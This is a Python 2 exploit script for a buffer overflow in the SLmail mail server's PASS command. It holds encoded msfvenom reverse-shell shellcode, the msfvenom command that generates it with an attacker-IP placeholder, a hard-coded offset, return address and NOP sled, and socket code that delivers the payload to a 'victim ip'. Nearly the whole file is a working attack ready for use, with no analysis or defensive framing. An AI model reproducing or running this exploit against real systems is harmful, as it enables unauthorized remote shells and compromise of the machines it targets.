#!/usr/bin/python
#This is a buffer overflow exploit for SLmail. The exploit opens a reverse shell on a specified port

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Generate your payload with msfvenom and set up a netcat listener.
#msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER IP> exitfunc=thread -f c -e x86/shikata_ga_nai -d "\x00\x0a\x0d"

shellcode = ("\xd9\xce\xba\x69\x02\xa2\xb4\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\xaf\x06\x40\x41\xd3\xef\x06"
"\xaa\x2b\xf0\x66\x22\xce\xc1\xa6\x50\x9b\x72\x17\x12\xc9\x7e"
"\xdc\x76\xf9\xf5\x90\x5e\x0e\xbd\x1f\xb9\x21\x3e\x33\xf9\x20"
"\xbc\x4e\x2e\x82\xfd\x80\x23\xc3\x3a\xfc\xce\x91\x93\x8a\x7d"
"\x05\x97\xc7\xbd\xae\xeb\xc6\xc5\x53\xbb\xe9\xe4\xc2\xb7\xb3"
"\x26\xe5\x14\xc8\x6e\xfd\x79\xf5\x39\x76\x49\x81\xbb\x5e\x83"
"\x6a\x17\x9f\x2b\x99\x69\xd8\x8c\x42\x1c\x10\xef\xff\x27\xe7"
"\x8d\xdb\xa2\xf3\x36\xaf\x15\xdf\xc7\x7c\xc3\x94\xc4\xc9\x87"
"\xf2\xc8\xcc\x44\x89\xf5\x45\x6b\x5d\x7c\x1d\x48\x79\x24\xc5"
"\xf1\xd8\x80\xa8\x0e\x3a\x6b\x14\xab\x31\x86\x41\xc6\x18\xcf"
"\xa6\xeb\xa2\x0f\xa1\x7c\xd1\x3d\x6e\xd7\x7d\x0e\xe7\xf1\x7a"
"\x71\xd2\x46\x14\x8c\xdd\xb6\x3d\x4b\x89\xe6\x55\x7a\xb2\x6c"
"\xa5\x83\x67\x22\xf5\x2b\xd8\x83\xa5\x8b\x88\x6b\xaf\x03\xf6"
"\x8c\xd0\xc9\x9f\x27\x2b\x9a\x95\xbc\x33\x1b\xc2\xc0\x33\x9a"
"\xa9\x4c\xd5\xf6\xdd\x18\x4e\x6f\x47\x01\x04\x0e\x88\x9f\x61"
"\x10\x02\x2c\x96\xdf\xe3\x59\x84\x88\x03\x14\xf6\x1f\x1b\x82"
"\x9e\xfc\x8e\x49\x5e\x8a\xb2\xc5\x09\xdb\x05\x1c\xdf\xf1\x3c"
"\xb6\xfd\x0b\xd8\xf1\x45\xd0\x19\xff\x44\x95\x26\xdb\x56\x63"
"\xa6\x67\x02\x3b\xf1\x31\xfc\xfd\xab\xf3\x56\x54\x07\x5a\x3e"
"\x21\x6b\x5d\x38\x2e\xa6\x2b\xa4\x9f\x1f\x6a\xdb\x10\xc8\x7a"
"\xa4\x4c\x68\x84\x7f\xd5\x88\x67\x55\x20\x21\x3e\x3c\x89\x2c"
"\xc1\xeb\xce\x48\x42\x19\xaf\xae\x5a\x68\xaa\xeb\xdc\x81\xc6"
"\x64\x89\xa5\x75\x84\x98")

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try:
    print "\nSending the evil buffer"
    s.connect(('victim ip', port)) #Insert the victim's IP and the attacked port number.
    data = s.recv(1024)
    s.send('USER hacker' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone"
except:
    print "Error"
